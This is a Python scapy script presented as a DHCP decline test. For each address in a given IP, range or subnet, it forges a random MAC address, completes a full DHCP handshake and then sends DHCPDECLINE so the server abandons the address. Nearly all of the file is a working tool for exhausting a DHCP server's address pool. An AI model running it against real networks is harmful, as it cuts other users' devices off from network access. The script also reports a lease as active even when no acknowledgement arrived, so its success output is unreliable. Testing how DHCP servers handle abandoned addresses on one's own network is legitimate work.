import argparse
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, AsyncSniffer
import random
import ipaddress
import time
import sys


def parse_arguments():
    parser = argparse.ArgumentParser(description="DHCP Decline Test Script for single IPs")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0)")
    parser.add_argument("-t", "--target", required=True,
                        help="Single target IP address to abandon (e.g., 192.168.10.244), a subnet "
                             "(e.g. 192.168.10.0/24), or a range of IP addresses (e.g. 192.168.10.20-192.168.10.30")
    parser.add_argument("--nodecline", required=False, action="store_true",
                        help="The approved IP address is NOT declined.")
    return parser.parse_args()


def get_ip_list(target):
    """
    Takes a CIDR, IP range, or single IP string and returns a list of IP addresses.

    Args:
        target (str): CIDR (10.0.0.0/24), Range (10.0.0.10-10.0.0.50), or Single IP.

    Returns:
        list: A list of IP addresses as strings.
    """
    ip_list = []

    if '-' in target:
        # Handle IP Range
        try:
            start_str, end_str = target.split('-')
            start_ip = ipaddress.ip_address(start_str.strip())
            end_ip = ipaddress.ip_address(end_str.strip())

            start_int = int(start_ip)
            end_int = int(end_ip)

            if start_int > end_int:
                raise ValueError("Start IP is greater than End IP.")

            ip_list = [str(ipaddress.ip_address(ip_int)) for ip_int in range(start_int, end_int + 1)]
        except ValueError as e:
            raise ValueError(f"Invalid IP range format: {e}")

    elif '/' in target:
        # Handle CIDR
        try:
            # strict=False allows host bits to be set (e.g., 10.20.30.5/24)
            network = ipaddress.ip_network(target, strict=False)
            ip_list = [str(ip) for ip in network]
        except ValueError as e:
            raise ValueError(f"Invalid CIDR format: {e}")

    else:
        # Handle Single IP
        try:
            ip_list = [str(ipaddress.ip_address(target))]
        except ValueError as e:
            raise ValueError(f"Invalid IP address format: {e}")

    return ip_list


def send_and_wait(packet_to_send, expected_msg_type, transaction_id, interface, timeout=5):
    """Starts a sniffer, sends a packet, and waits for a specific DHCP response."""

    def match_packet(pkt):
        if DHCP in pkt and pkt[BOOTP].xid == transaction_id:
            msg_type = next(
                (opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple) and opt[0] == "message-type"), None)
            return msg_type == expected_msg_type
        return False

    sniffer = AsyncSniffer(
        iface=interface,
        filter="udp port 68 and src port 67",
        stop_filter=match_packet
    )
    sniffer.start()
    time.sleep(0.5)

    sendp(packet_to_send, iface=interface, verbose=False)
    sniffer.join(timeout=timeout)

    # FIX: Ensure sniffer.results is not None before iterating
    if sniffer.results:
        for pkt in sniffer.results:
            if match_packet(pkt):
                return pkt

    return None


def main():
    args = parse_arguments()
    interface = args.interface
    target_ips = get_ip_list(args.target)

    for target_ip in target_ips:
        # Generate random MAC and Client ID (Hardware Type 1 + MAC)
        mac_bytes = bytes(
            [0x00, 0x16, 0x3E, random.randint(0x00, 0x7F), random.randint(0x00, 0xFF), random.randint(0x00, 0xFF)])
        client_mac = ':'.join(f'{b:02x}' for b in mac_bytes)
        client_id = b'\x01' + mac_bytes
        transaction_id = random.randint(1, 0xFFFFFFFF)

        print(f"Interface: {interface}")
        print(f"Target IP: {target_ip}")
        print(f"Spoofed MAC: {client_mac}")
        print(f"Client ID: {client_id.hex()}")
        print(f"Transaction ID: {hex(transaction_id)}")

        # Base OSI layers shared across all packets
        eth = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(op=1, chaddr=mac_bytes + b'\x00' * 10, xid=transaction_id)

        # STEP 1: DHCPDISCOVER
        print(f"\n[*] Sending DHCPDISCOVER for {target_ip}...")
        dhcp_discover = DHCP(options=[
            ("message-type", "discover"),
            ("client_id", client_id),
            ("requested_addr", target_ip),
            "end"
        ])
        discover_packet = eth / ip_layer / udp / bootp / dhcp_discover

        offer_pkt = send_and_wait(discover_packet, expected_msg_type=2, transaction_id=transaction_id, interface=interface)

        if not offer_pkt:
            print("[-] Error: No DHCPOFFER received. Check interface or IP pool availability.")
            continue

        offered_ip = offer_pkt[BOOTP].yiaddr
        server_identifier = next(
            (opt[1] for opt in offer_pkt[DHCP].options if isinstance(opt, tuple) and opt[0] == "server_id"), None)
        print(f"[+] Received DHCPOFFER: Server {server_identifier} offered IP {offered_ip}")

        # STEP 2: DHCPREQUEST
        print(f"\n[*] Sending DHCPREQUEST to formally accept {offered_ip}...")
        dhcp_request = DHCP(options=[
            ("message-type", "request"),
            ("client_id", client_id),
            ("requested_addr", offered_ip),
            ("server_id", server_identifier),
            "end"
        ])
        request_packet = eth / ip_layer / udp / bootp / dhcp_request

        ack_pkt = send_and_wait(request_packet, expected_msg_type=5, transaction_id=transaction_id, interface=interface)

        if not ack_pkt:
            print(f"[-] Error: No DHCPACK received. Server denied the request for {offered_ip}.")

        print(f"[+] Received DHCPACK: Lease for {offered_ip} is now fully active in the database.")

        if not args.nodecline:
            # STEP 3: DHCPDECLINE
            print(f"\n[*] Sending DHCPDECLINE for {offered_ip}...")
            dhcp_decline = DHCP(options=[
                ("message-type", "decline"),
                ("client_id", client_id),
                ("requested_addr", offered_ip),
                ("server_id", server_identifier),
                "end"
            ])
            decline_packet = eth / ip_layer / udp / bootp / dhcp_decline

            sendp(decline_packet, iface=interface, verbose=False)
            print("[+] Success: Full DORA handshake completed and DECLINE sent.")
        else:
            print("[+] Success: Full DORA handshake completed.")


if __name__ == "__main__":
    main()